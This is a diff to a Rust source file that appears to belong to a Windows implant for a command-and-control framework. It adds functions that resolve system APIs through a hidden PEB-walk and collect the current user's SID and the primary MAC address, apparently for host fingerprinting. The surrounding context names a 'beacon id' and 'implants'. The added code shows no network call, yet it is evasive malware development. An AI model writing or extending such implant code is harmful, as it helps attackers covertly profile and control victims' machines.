@@ -210,6 +210,144 @@ pub fn os() -> String {
     String::from("Windows")
 }
 
+/// Get the SID of the current user via `OpenProcessToken` +
+/// `GetTokenInformation`(TokenUser).  The SID is returned as raw bytes
+/// (up to 68 bytes — `SECURITY_MAX_SID_SIZE`), zero-padded if shorter.
+///
+/// Uses the same PEB-walk pattern as `is_admin()`: resolve `advapi32` exports,
+/// open the current process token, query `TokenUser`, and copy the SID before
+/// closing the handle.  Returns `None` if any step fails.
+pub fn machine_sid() -> Option<[u8; 68]> {
+    if !force_load(b"advapi32.dll") {
+        return None;
+    }
+    type GetCurrentProcess = unsafe extern "system" fn() -> *mut c_void;
+    type OpenProcessToken = unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
+    type GetTokenInformation =
+        unsafe extern "system" fn(*mut c_void, u32, *mut c_void, u32, *mut u32) -> i32;
+    type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
+
+    let gcp: GetCurrentProcess =
+        match unsafe { export_addr(b"kernel32.dll", b"GetCurrentProcess") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return None,
+        };
+    let opt: OpenProcessToken =
+        match unsafe { export_addr(b"advapi32.dll", b"OpenProcessToken") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return None,
+        };
+    let gti: GetTokenInformation =
+        match unsafe { export_addr(b"advapi32.dll", b"GetTokenInformation") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return None,
+        };
+    let close: CloseHandle = match unsafe { export_addr(b"kernel32.dll", b"CloseHandle") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return None,
+    };
+
+    let proc = unsafe { gcp() };
+    let mut token: *mut c_void = core::ptr::null_mut();
+    // TOKEN_QUERY = 0x0008
+    if unsafe { opt(proc, 0x0008, &mut token) } == 0 || token.is_null() {
+        return None;
+    }
+
+    // TokenUser = 1 (TOKEN_INFORMATION_CLASS).
+    // The output buffer contains a TOKEN_USER { SID_AND_ATTRIBUTES { PSID Sid;
+    // DWORD Attributes } } followed by the SID data.  On x64 PSID is 8 bytes
+    // at offset 0; the Sid pointer is adjusted to point within the buffer.
+    // 128 bytes is ample for any valid SID (max 68 B) + the header.
+    let mut buf = [0u8; 128];
+    let mut retlen: u32 = 0;
+    let ok = unsafe { gti(token, 1, buf.as_mut_ptr() as *mut c_void, 128, &mut retlen) };
+
+    if ok == 0 {
+        unsafe { close(token) };
+        return None;
+    }
+
+    // The SID pointer lives at buf[0..8] on x64.
+    let sid_ptr = unsafe { *(buf.as_ptr() as *const usize) } as *const u8;
+
+    if sid_ptr.is_null() {
+        unsafe { close(token) };
+        return None;
+    }
+
+    // SID layout: Revision(1) + SubAuthorityCount(1) + IdentifierAuthority(6)
+    //              + SubAuthority[count](4 * count).
+    // Max count is 15 → max size = 8 + 15*4 = 68.
+    let sub_auth_count = unsafe { *sid_ptr.add(1) } as usize;
+    let sid_len = core::cmp::min(8_usize.saturating_add(sub_auth_count.saturating_mul(4)), 68);
+
+    let mut sid = [0u8; 68];
+    // SAFETY: sid_ptr was written by GetTokenInformation into our stack buffer.
+    for i in 0..sid_len {
+        sid[i] = unsafe { *sid_ptr.add(i) };
+    }
+
+    unsafe { close(token) };
+    Some(sid)
+}
+
+/// Get the primary network adapter's MAC address via `GetAdaptersInfo`.
+/// Force-loads `iphlpapi.dll` and resolves `GetAdaptersInfo` through the PEB
+/// walk.  Returns the first non-zero MAC (6 bytes), or `None` on failure.
+pub fn primary_mac() -> Option<[u8; 6]> {
+    if !force_load(b"iphlpapi.dll") {
+        return None;
+    }
+    type GetAdaptersInfo = unsafe extern "system" fn(*mut u8, *mut u32) -> u32;
+    let f: GetAdaptersInfo =
+        match unsafe { export_addr(b"iphlpapi.dll", b"GetAdaptersInfo") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return None,
+        };
+
+    // First call with NULL buffer → get required size.
+    let mut size: u32 = 0;
+    let ret = unsafe { f(core::ptr::null_mut(), &mut size) };
+    // ERROR_BUFFER_OVERFLOW (111) is expected; anything else means no adapters.
+    if ret != 111 || size == 0 {
+        return None;
+    }
+
+    let mut buf = crate::heap::vec![0u8; size as usize];
+    let ret = unsafe { f(buf.as_mut_ptr(), &mut size) };
+    // ERROR_SUCCESS = 0
+    if ret != 0 {
+        return None;
+    }
+
+    // IP_ADAPTER_INFO layout (x64):
+    //   +0x00  Next           (8 B  pointer)
+    //   +0x08  ComboIndex     (4 B  DWORD)
+    //   +0x0C  AdapterName    (260 B  char[256+4])
+    //   +0x110 Description    (132 B  char[128+4])
+    //   +0x194 AddressLength  (4 B  UINT)
+    //   +0x198 Address        (8 B  BYTE[MAX_ADAPTER_ADDRESS_LENGTH])
+    // Address starts at 0x198; AddressLength (the actual MAC length) at 0x194.
+    const ADDR_LEN_OFF: usize = 0x194;
+    const ADDR_OFF: usize = 0x198;
+
+    if buf.len() <= ADDR_OFF + 6 {
+        return None;
+    }
+
+    let addr_len = unsafe { *(buf.as_ptr().add(ADDR_LEN_OFF) as *const u32) } as usize;
+    if addr_len >= 6 {
+        let addr_ptr = unsafe { buf.as_ptr().add(ADDR_OFF) };
+        let mut mac = [0u8; 6];
+        mac.copy_from_slice(unsafe { core::slice::from_raw_parts(addr_ptr, 6) });
+        if mac.iter().any(|&b| b != 0) {
+            return Some(mac);
+        }
+    }
+    None
+}
+
 /// Derive a per-process beacon id from `KUSER_SHARED_DATA`'s tick count mixed
 /// with the PID via xorshift32. Distinct across hosts and reboots, and distinct
 /// for two implants on the same host (different PIDs) — without needing a
